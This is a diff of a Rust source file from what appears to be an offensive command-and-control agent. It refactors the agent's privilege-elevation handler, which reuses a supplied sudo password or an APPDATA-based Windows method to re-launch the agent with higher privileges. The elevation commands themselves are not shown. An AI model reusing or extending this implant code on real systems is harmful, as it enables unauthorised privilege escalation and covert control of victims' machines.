@@ -2,7 +2,7 @@ use std::error::Error;
 use sysinfo::{System, SystemExt, UserExt};
 use whoami::username;
 use crate::config::ConfigOptions;
-use crate::cmd::CommandArgs;
+use crate::cmd::{CommandArgs, notion_out};
 use std::env::args;
 use std::process::Command;
 #[cfg(windows)] use std::env::{var};
@@ -57,7 +57,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                     let pwd = cmd_args.nth(0).unwrap();
                     // Check for empty pw
                     if pwd.is_empty() {
-                        return Ok("Need a sudo password!".to_string());
+                        return notion_out!("Need a sudo password!");
                     }
                     let encoded_config = config_options.to_base64();
                     let agent_path = args().nth(0).unwrap();
@@ -66,9 +66,9 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                     .arg("-c")
                     .arg(cmd_string)
                     .spawn()?;
-                    Ok("Elevation attempted. Look for the new agent!".to_string())
+                    notion_out!("Elevation attempted. Look for the new agent!")
             }
-                _ => Ok("Unknown elevation method".to_string())
+                _ => notion_out!("Unknown elevation method")
             }
         }
 
@@ -107,24 +107,24 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
                                     std::time::Duration::from_secs(1);
                                     std::thread::sleep(sleep_time);
                                 }
-                                Ok("Elevation attempted. Look for the new agent!".to_string())
+                                notion_out!("Elevation attempted. Look for the new agent!")
                             },
                             Err(e) => { return Ok(e.to_string())}
                         }  
                     } else {
-                        Ok("Couldn't get APPDATA location".to_string())
+                        notion_out!("Couldn't get APPDATA location")
                     }
 
                     
 
                 }
                 _ => {
-                    Ok("Elevation unavailable".to_string())
+                    notion_out!("Elevation unavailable")
                 }
             }
         }
 
     } else {
-        Ok("Elevation unavailable".to_string())
+        notion_out!("Elevation unavailable")
     }
 }
